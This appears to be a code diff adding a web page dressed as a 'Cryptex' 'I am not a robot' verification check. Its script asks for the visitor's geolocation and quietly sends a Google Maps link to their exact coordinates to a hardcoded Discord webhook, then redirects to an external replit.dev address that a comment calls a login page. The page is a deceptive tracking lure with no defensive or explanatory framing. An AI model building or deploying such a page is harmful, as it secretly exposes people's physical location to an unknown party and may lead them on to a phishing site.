@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            margin: 0;
+            overflow: hidden; /* Prevent scrolling */
+        }
+        .header {
+            background-color: #000;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            color: #fff;
+            text-decoration: none;
+            font-size: 24px;
+        }
+        .logo img {
+            margin-right: 10px;
+        }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 60px); /* Adjusted to subtract header height */
+            padding-top: 60px; /* Adjusted to avoid overlap with fixed header */
+            overflow-y: auto; /* Allow scrolling within the container if necessary */
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+        #verify-btn {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #verify-btn:hover {
+            background-color: #0056b3;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #09f;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s infinite linear;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header" data-header="">
+        <div class="container">
+            <a href="#" class="logo">
+                <img src="https://codewithsadee.github.io/cryptex/assets/images/logo.svg" width="32" height="32" alt="Cryptex logo">
+                Cryptex
+            </a>
+        </div>
+    </header>
+    <div class="main-container">
+        <h2 id="verify-message">I am not a robot. Please allow permission to verify.</h2>
+        <button id="verify-btn" onclick="requestLocationPermission()">Verify</button>
+        <div class="loading" id="loading-spinner">
+            <p>Please wait, we are verifying...</p>
+            <div class="spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        function requestLocationPermission() {
+            // Check if geolocation is available
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Permission granted, simulate verification process (replace with actual logic)
+                        document.getElementById('verify-message').innerText = "Please wait, we are verifying...";
+                        document.getElementById('verify-btn').style.display = 'none';
+                        document.getElementById('loading-spinner').style.display = 'block';
+
+                        // Construct the Discord webhook URL
+                        const webhookUrl = 'https://discord.com/api/webhooks/1254665668037709836/kLd8uFeEkxHK3Kas0RWP7Mhe05UfUrlELc53NPpwEJsbQ1fqOPDXw1QKaKSaHtZwVnkX';
+
+                        // Format the location data as a link
+                        const locationLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
+
+                        // Additional information to send
+                        const ip = 'Not available in client-side JavaScript'; // Not possible to directly get client's IP in browser JavaScript
+                        const country = 'Not available in client-side JavaScript'; // Not directly available in browser JavaScript
+                        const phoneCode = '+'; // You might fetch this from an external API or database
+                        const device = navigator.userAgent;
+                        const browser = navigator.appVersion;
+
+                        // Create the payload to send to the webhook
+                        const payload = {
+                            embeds: [{
+                                title: "User Verification Information",
+                                description: "Verification details for user.",
+                                fields: [
+                                   
+                                    { name: 'Location', value: locationLink },
+                                ],
+                                color: 16711680 // Red color for the embed (optional)
+                            }]
+                        };
+
+                        // Send the payload to the Discord webhook
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(payload),
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Verification information sent successfully to Discord webhook.');
+                                // Assuming verification succeeds
+                                setTimeout(function() {
+                                    window.location.href = "https://97b94c2f-09ef-491f-9d8e-91ebc2b0e052-00-18v3xnuyu8hbs.riker.replit.dev/"; // Redirect to login page
+                                }, 2000); // 2 seconds timeout for demo purpose
+                            } else {
+                                console.error('Failed to send verification information to Discord webhook:', response.statusText);
+                                alert('Failed to send verification information to Discord webhook. Please try again later.');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error sending verification information to Discord webhook:', error);
+                            alert('Failed to send verification information to Discord webhook. Please try again later.');
+                        });
+                    },
+                    function(error) {
+                        // Handle permission denied or error
+                        console.error('Error getting location:', error);
+                        alert('Location permission denied. Please allow location access to verify.');
+                    }
+                );
+            } else {
+                // Geolocation not available
+                alert('Geolocation is not supported by your browser.');
+            }
+        }
+    </script>
+</body>
+</html>
